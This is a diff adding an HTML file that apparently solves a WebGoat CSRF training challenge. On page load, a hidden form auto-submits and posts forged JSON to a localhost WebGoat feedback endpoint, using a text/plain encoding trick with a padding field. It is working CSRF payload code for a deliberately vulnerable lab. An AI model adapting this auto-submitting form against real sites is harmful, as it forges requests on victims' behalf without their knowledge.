@@ -1,0 +1,8 @@
+<!-- csrf 7 challenge -->
+<html>
+	<body onload=document.getElementById('csrf').submit()>
+		<form id="csrf" action="http://localhost:8080/WebGoat/csrf/feedback/message" method="POST" enctype="text/plain">
+			<input name='{"name":"WebGoat","email":"webgoat@webgoat.org","content":"WebGoat is the best!!","padding":"' value='garbage"}' type='hidden'>
+		</form>
+	</body>
+</html>
